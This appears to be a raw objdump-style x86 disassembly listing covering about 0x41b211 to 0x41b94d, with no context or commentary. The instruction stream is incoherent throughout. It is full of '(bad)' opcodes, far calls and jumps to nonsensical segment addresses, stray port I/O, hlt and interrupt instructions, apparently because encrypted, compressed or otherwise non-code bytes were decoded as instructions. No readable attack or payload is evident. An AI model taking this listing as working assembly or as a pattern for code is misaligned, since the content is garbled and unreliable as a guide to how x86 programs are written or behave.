  41b211:	jne    0x41b1cb
  41b213:	lods   al,BYTE PTR ds:[esi]
  41b214:	pop    ebp
  41b215:	mov    bh,BYTE PTR [esi+edx*4-0x1]
  41b219:	add    DWORD PTR [ecx-0x62],0x73
  41b21d:	les    ebp,FWORD PTR [eax]
  41b21f:	ss clc 
  41b221:	fst    DWORD PTR ss:[eax+0x2cb367b4]
  41b228:	sti    
  41b229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b22a:	add    al,0xdb
  41b22c:	cmp    bh,bl
  41b22e:	xchg   ebx,eax
  41b22f:	pop    esp
  41b230:	(bad)  
  41b231:	loop   0x41b28a
  41b233:	add    eax,0xb45ffc61
  41b238:	mov    eax,ds:0xb7b2f150
  41b23d:	ins    BYTE PTR es:[edi],dx
  41b23e:	neg    DWORD PTR [ebp-0x48e4c875]
  41b244:	cmp    BYTE PTR [edx+0x34],dl
  41b247:	jl     0x41b222
  41b249:	add    DWORD PTR [ebp+0x21],edx
  41b24c:	aad    0x6c
  41b24e:	mov    bl,0x2
  41b250:	or     al,0x72
  41b252:	test   BYTE PTR [eax-0xd587135],bh
  41b258:	dec    esp
  41b259:	ror    BYTE PTR [ecx+ecx*4+0x5e],1
  41b25d:	je     0x41b25b
  41b25f:	pop    eax
  41b260:	(bad)  
  41b261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b262:	(bad)  
  41b263:	pushf  
  41b264:	inc    ecx
  41b265:	call   0x24ba:0x2706226d
  41b26c:	call   0x9cedc1d0
  41b271:	dec    eax
  41b272:	xchg   DWORD PTR [edi+ecx*2+0x5],ecx
  41b276:	repnz (bad) 
  41b278:	sar    BYTE PTR [esi-0x7cbcea35],0xc9
  41b27f:	jb     0x41b291
  41b281:	outs   dx,DWORD PTR ds:[esi]
  41b282:	mov    al,ds:0x58f946e8
  41b287:	sub    ch,ch
  41b289:	xchg   BYTE PTR [ebx+0x8],dl
  41b28c:	cdq    
  41b28d:	dec    ebx
  41b28e:	jnp    0x41b2de
  41b290:	pop    edi
  41b291:	mov    bh,0xfc
  41b293:	adc    al,BYTE PTR [edx+0x65]
  41b296:	xor    BYTE PTR [ebp-0x16e09ee4],0x36
  41b29d:	into   
  41b29e:	cs cwde 
  41b2a0:	xchg   DWORD PTR ds:0x52f6842a,eax
  41b2a6:	pop    esi
  41b2a7:	scas   al,BYTE PTR es:[edi]
  41b2a8:	add    dh,bh
  41b2aa:	sbb    bl,BYTE PTR [ebx-0x55]
  41b2ad:	pop    ebx
  41b2ae:	stos   BYTE PTR es:[edi],al
  41b2af:	add    DWORD PTR [edi+0x394a5d0],0x55
  41b2b6:	adc    al,0xbf
  41b2b8:	jmp    0x41b30d
  41b2ba:	add    eax,0x9adcf4e1
  41b2bf:	and    DWORD PTR [edi],edi
  41b2c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2c2:	rol    DWORD PTR [ecx],0x1a
  41b2c5:	fidivr WORD PTR [edx]
  41b2c7:	pop    ss
  41b2c8:	or     DWORD PTR [ebp+ebx*8+0x41a5faf5],ebx
  41b2cf:	iret   
  41b2d0:	lds    ecx,FWORD PTR [ebx]
  41b2d2:	mov    esi,0xbdfbf142
  41b2d7:	cmp    BYTE PTR [ecx-0xdda6447],al
  41b2dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2df:	mov    dl,0x6b
  41b2e2:	sti    
  41b2e3:	test   BYTE PTR [edi+ebp*1-0x1a],ch
  41b2e7:	dec    ebp
  41b2e8:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41b2ea:	daa    
  41b2eb:	inc    ecx
  41b2ec:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41b2ee:	push   esi
  41b2ef:	mov    eax,ds:0x4544cc9
  41b2f4:	cmp    DWORD PTR [ebx+0x78e94de1],ecx
  41b2fa:	jns    0x41b2b1
  41b2fc:	(bad)  [edx+0xd7b30cf]
  41b302:	rol    edx,1
  41b304:	lds    ebx,FWORD PTR [edi+0x5317e34a]
  41b30a:	bound  ebp,QWORD PTR [esi-0xc2059f5]
  41b310:	or     DWORD PTR [esi-0x6151f96],ebp
  41b316:	jecxz  0x41b2b7
  41b318:	out    0x68,al
  41b31a:	stos   DWORD PTR es:[edi],eax
  41b31b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b31c:	cmp    bl,BYTE PTR [edx]
  41b31e:	(bad)  
  41b31f:	outs   dx,DWORD PTR ds:[esi]
  41b320:	psubsb mm4,QWORD PTR [edx]
  41b323:	stos   BYTE PTR es:[edi],al
  41b324:	ss dec ebp
  41b326:	pop    ecx
  41b327:	and    eax,0xb01f0dbf
  41b32c:	adc    BYTE PTR ds:0x63f2c610,0xee
  41b333:	(bad)  
  41b334:	pushf  
  41b335:	loopne 0x41b38d
  41b337:	and    eax,0x3ef92f1a
  41b33c:	scas   al,BYTE PTR es:[edi]
  41b33d:	mov    dl,0xb9
  41b33f:	fdivr  QWORD PTR [edx-0x5431b356]
  41b345:	(bad)  
  41b346:	lods   al,BYTE PTR ds:[esi]
  41b347:	sbb    al,0x3
  41b349:	sub    DWORD PTR [esi-0x48],esi
  41b34c:	ins    BYTE PTR es:[edi],dx
  41b34d:	out    0x95,al
  41b34f:	iret   
  41b350:	pushf  
  41b351:	add    eax,0xaf61c966
  41b356:	ja     0x41b2fb
  41b358:	pop    eax
  41b359:	dec    ebx
  41b35a:	push   es
  41b35b:	call   0x584b:0x93e391ae
  41b362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b363:	loop   0x41b381
  41b365:	inc    ebp
  41b366:	(bad)  [eax-0x69b2d454]
  41b36c:	ins    DWORD PTR es:[edi],dx
  41b36d:	mov    eax,0x11ccc053
  41b372:	jno    0x41b34f
  41b374:	retf   
  41b375:	inc    edi
  41b376:	sbb    eax,0xf32d4870
  41b37b:	retf   0x6c84
  41b37e:	outs   dx,BYTE PTR ds:[esi]
  41b37f:	into   
  41b380:	js     0x41b3a0
  41b382:	arpl   WORD PTR [ebx-0x17a51805],cx
  41b388:	and    al,0x51
  41b38a:	or     DWORD PTR [ebx-0x2b],0x11b54498
  41b391:	popa   
  41b392:	enter  0xf315,0xfa
  41b396:	call   FWORD PTR [ecx-0x6]
  41b399:	xor    al,0xe3
  41b39b:	pop    ebx
  41b39c:	sub    al,ah
  41b39e:	add    BYTE PTR [esi-0x5f0d5a29],al
  41b3a4:	int3   
  41b3a5:	jmp    0xec38:0x166c198d
  41b3ac:	sub    BYTE PTR [ecx+eax*1-0x62],cl
  41b3b0:	aas    
  41b3b1:	cld    
  41b3b2:	inc    esp
  41b3b3:	into   
  41b3b4:	or     cl,dh
  41b3b6:	jne    0x41b3cb
  41b3b8:	daa    
  41b3b9:	call   0x8b2b:0xa60101ec
  41b3c0:	imul   BYTE PTR [edx-0x5b]
  41b3c3:	bound  edx,QWORD PTR [ecx]
  41b3c5:	jmp    0x75d2:0x486db2b2
  41b3cc:	stc    
  41b3cd:	test   DWORD PTR [eax-0x4e],0x64d0145c
  41b3d4:	sbb    dh,BYTE PTR [ebp+ebp*8-0x21]
  41b3d8:	cmp    BYTE PTR [edi+ebp*8-0x3bbf6810],cl
  41b3df:	in     eax,0xcd
  41b3e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3e2:	push   ds
  41b3e3:	sub    eax,0xbe891e2f
  41b3e8:	cld    
  41b3e9:	or     DWORD PTR [ebx-0x6ad4eb3e],edi
  41b3ef:	adc    ch,BYTE PTR [ebx]
  41b3f1:	sbb    edi,DWORD PTR [ebx]
  41b3f3:	push   edx
  41b3f4:	loopne 0x41b3de
  41b3f6:	cmc    
  41b3f7:	mov    ebp,0xafb9e999
  41b3fc:	xchg   ebp,eax
  41b3fd:	push   esi
  41b3fe:	fucomi st,st(3)
  41b400:	xor    eax,0x4e2a41e0
  41b405:	into   
  41b406:	clc    
  41b407:	jecxz  0x41b3a2
  41b409:	mov    ch,0xca
  41b40b:	sahf   
  41b40c:	xchg   esi,eax
  41b40d:	add    edi,eax
  41b40f:	sub    eax,0xbd134dad
  41b414:	inc    eax
  41b415:	pop    edx
  41b416:	pop    ds
  41b417:	sub    eax,0x51b7f8aa
  41b41c:	int3   
  41b41d:	mov    ebx,0xbb6aec3e
  41b422:	jg     0x41b49c
  41b424:	test   eax,0xbe9c0585
  41b429:	cld    
  41b42a:	sbb    eax,0x1d280c42
  41b42f:	aad    0xa3
  41b431:	retf   0xf8b2
  41b434:	jo     0x41b42b
  41b436:	and    al,BYTE PTR [edx-0x27]
  41b439:	inc    eax
  41b43a:	loop   0x41b4b9
  41b43c:	xchg   ebx,eax
  41b43d:	imul   edi,DWORD PTR fs:[eax+0x366066c5],0x90888b70
  41b448:	pushf  
  41b449:	xchg   edi,eax
  41b44a:	(bad)  [ecx-0x2a]
  41b44d:	pop    edx
  41b44e:	lods   eax,DWORD PTR ds:[esi]
  41b44f:	add    BYTE PTR [edi+edi*2+0x1c],0x9f
  41b454:	clc    
  41b455:	int3   
  41b456:	(bad)  
  41b457:	jae    0x41b3ee
  41b459:	retf   0x2f3d
  41b45c:	pop    ss
  41b45d:	mov    ch,0x97
  41b45f:	scas   al,BYTE PTR es:[edi]
  41b460:	sbb    DWORD PTR [ebp+0x511d22b3],edx
  41b466:	inc    esp
  41b467:	ja     0x41b41c
  41b469:	out    dx,al
  41b46a:	retf   0xbed9
  41b46d:	cwde   
  41b46e:	fisttp QWORD PTR [esi]
  41b470:	push   es
  41b471:	sbb    eax,esp
  41b473:	sub    eax,0x80cd6cbc
  41b478:	test   BYTE PTR ds:[edi-0x5fe73b46],bl
  41b47f:	push   ebp
  41b480:	xchg   eax,eax
  41b482:	or     esi,ecx
  41b484:	pushf  
  41b485:	inc    esi
  41b486:	call   0x97eb:0xf0576538
  41b48d:	das    
  41b48e:	out    dx,al
  41b48f:	mov    ebx,0xa81cb65b
  41b494:	aam    0x5a
  41b496:	mov    dh,0xf1
  41b498:	mov    DWORD PTR [edx+0x18],esi
  41b49b:	inc    edx
  41b49c:	out    0x2f,al
  41b49e:	sbb    DWORD PTR [ecx-0x7d737ee0],edx
  41b4a4:	xchg   edx,eax
  41b4a5:	push   ecx
  41b4a6:	outs   dx,DWORD PTR ds:[esi]
  41b4a7:	pusha  
  41b4a8:	ror    BYTE PTR [esi+ebp*4-0x4b],cl
  41b4ac:	pop    ebx
  41b4ad:	or     eax,0x87f35ce0
  41b4b2:	mov    DWORD PTR [ebx],ebp
  41b4b4:	add    esp,DWORD PTR [esi-0x30]
  41b4b7:	mov    esp,0xead63e6f
  41b4bc:	adc    al,0xb
  41b4be:	cmc    
  41b4bf:	hlt    
  41b4c0:	sbb    BYTE PTR [esi-0x38e07848],cl
  41b4c6:	bound  esi,QWORD PTR [ecx-0x75]
  41b4c9:	mov    ebx,0x83db5ed4
  41b4ce:	xchg   ebx,eax
  41b4cf:	jl     0x41b485
  41b4d1:	fisttp QWORD PTR [esi-0x6bb8082f]
  41b4d7:	mov    esi,0x6eec0138
  41b4dc:	cmp    eax,0xde76f2d8
  41b4e1:	ror    DWORD PTR [ecx+0x211a79fc],1
  41b4e7:	ja     0x41b546
  41b4e9:	stos   BYTE PTR es:[edi],al
  41b4ea:	xor    al,BYTE PTR [ebp+0x79a6c3b1]
  41b4f0:	out    0x88,al
  41b4f2:	mov    WORD PTR [edi+0x6],?
  41b4f5:	les    esi,FWORD PTR [ebx]
  41b4f7:	outs   dx,BYTE PTR ds:[esi]
  41b4f8:	je     0x41b486
  41b4fa:	jns    0x41b51b
  41b4fc:	xchg   esi,eax
  41b4fd:	out    dx,al
  41b4fe:	cmp    DWORD PTR [esi+0x5a],0x889d412d
  41b505:	add    al,0x5c
  41b507:	nop
  41b508:	add    al,BYTE PTR [ebp-0x52]
  41b50b:	fdivr  DWORD PTR [ebx-0x1a35c69b]
  41b511:	test   BYTE PTR [ebx+eiz*1],ah
  41b514:	out    dx,eax
  41b515:	shl    BYTE PTR [edi],1
  41b517:	outs   dx,BYTE PTR ds:[esi]
  41b518:	sti    
  41b519:	out    0xea,al
  41b51b:	test   DWORD PTR [edx+0x70c89abd],esi
  41b521:	jmp    0xf034:0x4a9709ad
  41b528:	pop    esi
  41b529:	pop    ebx
  41b52a:	dec    ebx
  41b52b:	call   0xe6191023
  41b530:	test   al,0x55
  41b532:	xchg   esp,eax
  41b533:	and    DWORD PTR [esi-0x2443b49c],edi
  41b539:	pusha  
  41b53a:	fdiv   st,st(2)
  41b53c:	or     DWORD PTR [ebp-0xa28fafa],eax
  41b542:	arpl   WORD PTR [esp+ecx*8+0x175718b6],di
  41b549:	int    0xc
  41b54b:	mov    bl,0xe5
  41b54d:	jae    0x41b5c3
  41b54f:	jb     0x41b51d
  41b551:	lods   al,BYTE PTR ds:[esi]
  41b552:	and    dl,BYTE PTR [edx]
  41b554:	repz push ds
  41b556:	lods   eax,DWORD PTR ds:[esi]
  41b557:	fisub  WORD PTR [ebp+0x5]
  41b55a:	scas   eax,DWORD PTR es:[edi]
  41b55b:	adc    cl,al
  41b55d:	adc    DWORD PTR [ebx+0x2a],0xffffffba
  41b561:	add    eax,0x329a8da7
  41b566:	pusha  
  41b567:	jnp    0x41b592
  41b569:	pop    edi
  41b56a:	(bad)  
  41b56b:	mov    eax,ds:0x6729cfd7
  41b570:	add    eax,0xbdf52f2e
  41b575:	js     0x41b5dd
  41b577:	xor    al,BYTE PTR [esi-0x20]
  41b57a:	pop    ecx
  41b57b:	outs   dx,DWORD PTR ds:[esi]
  41b57c:	push   ecx
  41b57d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b57e:	jns    0x41b505
  41b580:	fs sbb esi,ecx
  41b583:	stos   DWORD PTR es:[edi],eax
  41b584:	loope  0x41b5c1
  41b586:	and    BYTE PTR [ecx+0x2f],0xa3
  41b58a:	pop    ecx
  41b58b:	stos   DWORD PTR es:[edi],eax
  41b58c:	and    esi,DWORD PTR [edx+0x5f]
  41b58f:	nop
  41b590:	cmp    al,0xba
  41b592:	pop    eax
  41b593:	fimul  WORD PTR [ebp-0x63]
  41b596:	jge    0x41b55e
  41b598:	pop    ebx
  41b599:	or     esi,DWORD PTR [ebx]
  41b59b:	out    0xbc,al
  41b59d:	retf   0xbb48
  41b5a0:	pop    edi
  41b5a1:	jmp    0x8b079f7f
  41b5a6:	mov    DWORD PTR ds:0xee550b99,0x91980f5
  41b5b0:	push   edx
  41b5b1:	push   ds
  41b5b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5b3:	push   edx
  41b5b4:	imul   eax,edx,0xffffffeb
  41b5b7:	pushf  
  41b5b8:	push   esp
  41b5b9:	pop    ds
  41b5ba:	imul   edx,DWORD PTR [ebp-0x2ab5db67],0x23f1a306
  41b5c4:	push   ds
  41b5c5:	rol    DWORD PTR [eax],0xdc
  41b5c8:	ins    DWORD PTR es:[edi],dx
  41b5c9:	sub    BYTE PTR ds:0xc25e2e1f,dl
  41b5cf:	pop    ebx
  41b5d0:	je     0x41b55d
  41b5d2:	add    cl,ah
  41b5d4:	jecxz  0x41b647
  41b5d6:	sbb    al,0x35
  41b5d8:	test   BYTE PTR [eax+esi*8],0xe6
  41b5dc:	xor    al,0xbc
  41b5de:	pop    ds
  41b5df:	cmc    
  41b5e0:	shl    DWORD PTR [ecx],cl
  41b5e2:	in     eax,0xad
  41b5e4:	jns    0x41b5b7
  41b5e6:	mov    cl,0x24
  41b5e8:	aad    0xa
  41b5ea:	daa    
  41b5eb:	sub    eax,0xe8d29d54
  41b5f0:	jmp    0x18e1:0x68e302d6
  41b5f7:	fst    QWORD PTR cs:[edx-0x55]
  41b5fb:	or     ecx,0xcdc51988
  41b601:	xchg   edi,eax
  41b602:	mov    bh,0xa0
  41b604:	bound  esi,QWORD PTR [eax]
  41b606:	cmp    cl,BYTE PTR [esi]
  41b608:	ins    BYTE PTR es:[edi],dx
  41b609:	cdq    
  41b60a:	in     eax,dx
  41b60b:	(bad)  
  41b60c:	fiadd  WORD PTR [ecx-0xdd4b35f]
  41b612:	xchg   ebp,eax
  41b613:	pop    ebx
  41b614:	xchg   ecx,eax
  41b615:	xchg   esp,eax
  41b616:	pop    edx
  41b617:	cwde   
  41b618:	out    dx,al
  41b619:	jl     0x41b684
  41b61b:	clc    
  41b61c:	fcomp  st(3)
  41b61e:	cwde   
  41b61f:	rcl    BYTE PTR [ecx+0x17f3396d],1
  41b625:	push   esi
  41b626:	ret    
  41b627:	cmp    al,0xa7
  41b629:	bound  esi,QWORD PTR [edi+0xf]
  41b62c:	sbb    edx,DWORD PTR [ecx]
  41b62e:	add    edi,DWORD PTR [edi-0x14a4ef51]
  41b634:	outs   dx,BYTE PTR ds:[esi]
  41b635:	cli    
  41b636:	push   ecx
  41b637:	adc    dl,BYTE PTR [ecx]
  41b639:	cmp    ecx,DWORD PTR [edx+edx*8]
  41b63c:	dec    edx
  41b63d:	das    
  41b63e:	loope  0x41b620
  41b640:	rcr    BYTE PTR [ecx],cl
  41b642:	outs   dx,BYTE PTR ds:[esi]
  41b643:	mov    DWORD PTR [eax],esi
  41b645:	lods   eax,DWORD PTR ds:[esi]
  41b646:	mov    WORD PTR [edi],ss
  41b648:	lea    ecx,[edi]
  41b64a:	data16 add dh,BYTE PTR [edi]
  41b64d:	add    BYTE PTR [ebx+0x4a],ah
  41b650:	es sbb ch,dh
  41b653:	dec    ecx
  41b654:	stos   BYTE PTR es:[edi],al
  41b655:	inc    esp
  41b656:	iret   
  41b657:	in     eax,dx
  41b658:	mov    esp,0xba86f797
  41b65d:	push   ebx
  41b65e:	push   0xc147d034
  41b663:	ja     0x41b5f8
  41b665:	dec    ebx
  41b666:	inc    edx
  41b667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b668:	or     dh,al
  41b66a:	inc    ebx
  41b66b:	pop    es
  41b66c:	stos   DWORD PTR es:[edi],eax
  41b66d:	loop   0x41b5f4
  41b66f:	rcr    esp,1
  41b671:	and    eax,0x19887b49
  41b676:	xchg   edx,eax
  41b677:	rol    BYTE PTR [eax+0x14],cl
  41b67a:	int3   
  41b67b:	mov    cl,0x4a
  41b67d:	icebp  
  41b67e:	push   ecx
  41b67f:	and    eax,0x27a27418
  41b684:	fnstsw WORD PTR [ecx+0x65]
  41b687:	mov    edi,0xeec0104f
  41b68c:	and    esp,DWORD PTR [edx+0xf4d4252]
  41b692:	mov    ss,WORD PTR [ebx+0x1e1817ba]
  41b698:	inc    eax
  41b699:	mov    al,BYTE PTR [ebp+edi*2+0x3]
  41b69d:	(bad)  
  41b69e:	mov    edi,0x2db5ef52
  41b6a3:	and    DWORD PTR [ebp+0x1c],0x5d
  41b6a7:	ret    
  41b6a8:	lahf   
  41b6a9:	retf   0xc738
  41b6ac:	pop    esi
  41b6ad:	fdivr  DWORD PTR [esi+0x60bac80]
  41b6b3:	shr    BYTE PTR [ebp+ebp*8-0x7de5c88],cl
  41b6ba:	stos   DWORD PTR es:[edi],eax
  41b6bb:	adc    DWORD PTR [eax],esp
  41b6bd:	in     al,0x1e
  41b6bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6c0:	ins    DWORD PTR es:[edi],dx
  41b6c1:	adc    BYTE PTR [edi-0x19],0x7e
  41b6c5:	add    DWORD PTR [edi],esp
  41b6c7:	inc    ebx
  41b6c8:	sbb    eax,0x35bcb5c8
  41b6cd:	xor    al,BYTE PTR [ebp-0x12]
  41b6d0:	cs lahf 
  41b6d2:	in     eax,0xf4
  41b6d4:	xchg   BYTE PTR [esi+0x27e0ac9f],cl
  41b6da:	aaa    
  41b6db:	fdiv   DWORD PTR [eax+edx*4+0x71]
  41b6df:	int3   
  41b6e0:	push   esp
  41b6e1:	retf   
  41b6e2:	hlt    
  41b6e3:	pusha  
  41b6e4:	mov    BYTE PTR [eax],ch
  41b6e6:	dec    edi
  41b6e7:	sti    
  41b6e8:	pop    edi
  41b6e9:	pop    esp
  41b6ea:	or     edx,DWORD PTR ds:0xae9f66da
  41b6f0:	sbb    eax,0x95285d48
  41b6f5:	das    
  41b6f6:	mov    al,ds:0x3ec96ad6
  41b6fb:	gs mov esi,0xd3344b1f
  41b701:	sbb    eax,0x125fd1f5
  41b706:	or     DWORD PTR [esi],eax
  41b708:	les    edi,FWORD PTR [ebp-0x61]
  41b70b:	jnp    0x41b6de
  41b70d:	nop
  41b70e:	xchg   edi,eax
  41b70f:	(bad)  
  41b710:	pop    eax
  41b711:	fistp  QWORD PTR [ebp-0x3fff65f7]
  41b717:	cdq    
  41b718:	into   
  41b719:	xchg   ebx,eax
  41b71a:	and    DWORD PTR [ebp-0x636936ff],edx
  41b720:	pop    esp
  41b721:	popf   
  41b722:	mov    al,0x34
  41b724:	loope  0x41b772
  41b726:	das    
  41b727:	push   edi
  41b728:	push   eax
  41b729:	mov    eax,ds:0xe2a5168
  41b72e:	dec    ecx
  41b72f:	stos   DWORD PTR es:[edi],eax
  41b730:	iret   
  41b731:	dec    ecx
  41b732:	cmp    dl,dh
  41b734:	sub    al,0x23
  41b736:	fild   DWORD PTR [ecx]
  41b738:	mov    al,BYTE PTR [eax]
  41b73a:	loop   0x41b797
  41b73c:	hlt    
  41b73d:	pop    ss
  41b73e:	mov    eax,ds:0x3a4f1068
  41b743:	aas    
  41b744:	fwait
  41b745:	or     BYTE PTR [esi],0x82
  41b748:	xchg   edi,eax
  41b749:	add    dh,0x7a
  41b74c:	inc    ecx
  41b74d:	adc    ecx,DWORD PTR [esi-0x4db08cd7]
  41b753:	jle    0x41b70d
  41b755:	out    dx,al
  41b756:	test   al,0xf8
  41b758:	xchg   esp,eax
  41b759:	(bad)  
  41b75a:	fisub  WORD PTR [ecx+0x75cc29b2]
  41b760:	pop    ecx
  41b761:	mov    eax,ds:0x92f3aac3
  41b766:	cli    
  41b767:	ja     0x41b759
  41b769:	cmp    esp,DWORD PTR [eax+0x5fec5414]
  41b76f:	mov    edi,0x47ceb97
  41b774:	test   eax,0x6043c1af
  41b779:	xor    DWORD PTR [edi],edi
  41b77b:	outs   dx,BYTE PTR ds:[esi]
  41b77c:	nop
  41b77d:	xor    edx,esi
  41b77f:	out    dx,eax
  41b780:	gs cdq 
  41b782:	imul   eax,ebp,0x38
  41b785:	adc    BYTE PTR [ebx+0x46],cl
  41b788:	lods   al,BYTE PTR ds:[esi]
  41b789:	jo     0x41b73d
  41b78b:	mov    ecx,0x6b4421e7
  41b790:	add    eax,0xc7c3cfa0
  41b795:	fchs   
  41b797:	or     esp,ebp
  41b799:	leave  
  41b79a:	jb     0x41b7b0
  41b79c:	aaa    
  41b79d:	fild   QWORD PTR [ebx]
  41b79f:	in     al,0xde
  41b7a1:	test   al,0x63
  41b7a3:	cld    
  41b7a4:	dec    edi
  41b7a5:	mov    DWORD PTR [ebx],eax
  41b7a7:	test   DWORD PTR [ecx],0xc9ebc3e2
  41b7ad:	stos   BYTE PTR es:[edi],al
  41b7ae:	sbb    ebp,esi
  41b7b0:	outs   dx,BYTE PTR ds:[esi]
  41b7b1:	push   0xe4727fb1
  41b7b6:	call   0x1a4a:0x143e7f67
  41b7bd:	cmc    
  41b7be:	mov    esp,0x67fb736f
  41b7c3:	test   DWORD PTR [eax+0x1de62d92],esp
  41b7c9:	mov    BYTE PTR [ebx],bl
  41b7cb:	loop   0x41b805
  41b7cd:	and    BYTE PTR [edx+eiz*8-0x50fd848a],dl
  41b7d4:	adc    BYTE PTR [edx-0x1a089142],al
  41b7da:	xchg   esp,eax
  41b7db:	and    DWORD PTR [esi+0x51edef97],ebp
  41b7e1:	or     al,0x6c
  41b7e3:	adc    BYTE PTR [eax+ebx*1],bh
  41b7e6:	int    0x5e
  41b7e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7e9:	int3   
  41b7ea:	popa   
  41b7eb:	imul   eax,esp,0xffffffa6
  41b7ee:	mov    ebx,0xc75a7c8a
  41b7f3:	out    dx,al
  41b7f4:	dec    DWORD PTR [ecx-0x7bde8bac]
  41b7fa:	aam    0x7b
  41b7fc:	rcl    esp,1
  41b7fe:	shr    BYTE PTR [esi-0x22],1
  41b801:	enter  0x325,0xa7
  41b805:	fisttp QWORD PTR [edi-0x12]
  41b808:	sbb    edi,DWORD PTR [ebx]
  41b80a:	cwde   
  41b80b:	dec    ebp
  41b80c:	cmp    bl,BYTE PTR [eax]
  41b80e:	mov    ecx,0xa8eb192c
  41b813:	or     BYTE PTR [edx+0x5a],ch
  41b816:	mov    esp,0xf3c85912
  41b81b:	cmp    al,0x8f
  41b81d:	(bad)  
  41b81e:	int    0xa5
  41b820:	jge    0x41b856
  41b822:	mov    dl,0x60
  41b824:	jnp    0x41b82b
  41b826:	test   al,0x77
  41b828:	call   0xa7d4:0xf7f37677
  41b82f:	mov    cl,0x4c
  41b831:	push   ss
  41b832:	add    ecx,DWORD PTR [ebx-0x27]
  41b835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b836:	pop    ebp
  41b837:	dec    edx
  41b838:	mov    cl,0x73
  41b83a:	imul   esi,DWORD PTR [edi],0x6e
  41b83d:	test   BYTE PTR [ecx],ch
  41b83f:	stc    
  41b840:	jae    0x41b808
  41b842:	fiadd  WORD PTR [esi]
  41b844:	jg     0x41b86e
  41b846:	dec    edi
  41b847:	xchg   DWORD PTR [edi+0xcdd2064],ebx
  41b84d:	iret   
  41b84e:	bound  edx,QWORD PTR [ecx]
  41b850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b851:	pop    ss
  41b852:	loop   0x41b811
  41b854:	adc    eax,0x4d808fe9
  41b859:	mul    DWORD PTR [esi-0x33]
  41b85c:	mov    esp,0x43247fbe
  41b861:	adc    ebx,DWORD PTR [ebp+0x9797612]
  41b867:	add    edi,DWORD PTR ds:0x29681559
  41b86d:	mov    dl,0x78
  41b86f:	(bad)  
  41b870:	jbe    0x41b8bb
  41b872:	hlt    
  41b873:	mov    ebp,0xade8e0fd
  41b878:	ins    BYTE PTR es:[edi],dx
  41b879:	stos   DWORD PTR es:[edi],eax
  41b87a:	xchg   ebp,eax
  41b87b:	ja     0x41b80b
  41b87d:	cmp    esi,DWORD PTR [ecx]
  41b87f:	les    ebp,FWORD PTR [ecx-0x1d]
  41b882:	sub    BYTE PTR [edx+0x4],al
  41b885:	call   0x613:0x9fdce1ce
  41b88c:	or     dl,al
  41b88e:	hlt    
  41b88f:	in     al,dx
  41b890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b891:	or     eax,0xdc0fdfff
  41b896:	cmp    edx,DWORD PTR [esi]
  41b898:	inc    ecx
  41b899:	das    
  41b89a:	iret   
  41b89b:	mov    edi,0x293e195f
  41b8a0:	sbb    DWORD PTR [ecx-0x58],esi
  41b8a3:	inc    ebp
  41b8a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8a5:	nop
  41b8a6:	and    al,0xa5
  41b8a8:	test   BYTE PTR [esi-0x2690fcf5],al
  41b8ae:	push   0x53e9e44c
  41b8b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8b4:	imul   esi,esi,0xffffff9e
  41b8b7:	outs   dx,BYTE PTR ds:[esi]
  41b8b8:	inc    eax
  41b8b9:	pop    edx
  41b8ba:	lods   al,BYTE PTR ds:[esi]
  41b8bb:	mov    edi,0x6b2b6b15
  41b8c0:	adc    al,0x1e
  41b8c2:	lods   eax,DWORD PTR ds:[esi]
  41b8c3:	fdiv   st,st(2)
  41b8c5:	push   ebp
  41b8c6:	xor    ah,ch
  41b8c8:	(bad)  
  41b8c9:	ds push ds
  41b8cb:	outs   dx,BYTE PTR ds:[esi]
  41b8cc:	adc    eax,0x903237ee
  41b8d1:	outs   dx,BYTE PTR ds:[esi]
  41b8d2:	outs   dx,BYTE PTR ds:[esi]
  41b8d3:	sbb    bl,ch
  41b8d5:	push   edx
  41b8d6:	adc    BYTE PTR [ebx-0x2a],ch
  41b8d9:	(bad)  
  41b8da:	xchg   ebp,eax
  41b8db:	jo     0x41b87d
  41b8dd:	jl     0x41b876
  41b8df:	or     bl,bl
  41b8e1:	cmp    DWORD PTR [edx-0x3eb79235],edx
  41b8e7:	jmp    0x74c9:0x64d10765
  41b8ee:	scas   al,BYTE PTR es:[edi]
  41b8ef:	in     eax,dx
  41b8f0:	jbe    0x41b8aa
  41b8f2:	mov    edi,edx
  41b8f4:	pushf  
  41b8f5:	adc    esi,ecx
  41b8f7:	jno    0x6ae962ed
  41b8fd:	rcr    DWORD PTR ds:0x2dc0f70f,cl
  41b903:	les    esi,FWORD PTR ds:0x323d9ca0
  41b909:	in     al,0x54
  41b90b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b90c:	lock jnp 0x41b897
  41b90f:	imul   ebx,edi,0xffffffc2
  41b912:	in     al,0xe2
  41b914:	out    dx,al
  41b915:	ret    0x66ac
  41b918:	or     DWORD PTR [ecx],0x1ffaa30d
  41b91e:	and    BYTE PTR [eax+0x2eb5699],ch
  41b924:	loopne 0x41b918
  41b926:	or     ebx,eax
  41b928:	clc    
  41b929:	jecxz  0x41b915
  41b92b:	hlt    
  41b92c:	pop    ss
  41b92d:	xchg   BYTE PTR [ebx+ebp*1-0x12],dh
  41b931:	mov    cl,0xb1
  41b933:	fst    DWORD PTR [esp+0x6d1bf2c4]
  41b93a:	sub    eax,0xd1465cc2
  41b93f:	jae    0x41b989
  41b941:	push   ebx
  41b942:	arpl   WORD PTR [edi],bp
  41b944:	jno    0x41b8f2
  41b946:	mov    ebx,0x5b1af77c
  41b94b:	mov    al,0xe5
  41b94d:	rol    DWORD PTR [esi-0x6d],0xc4
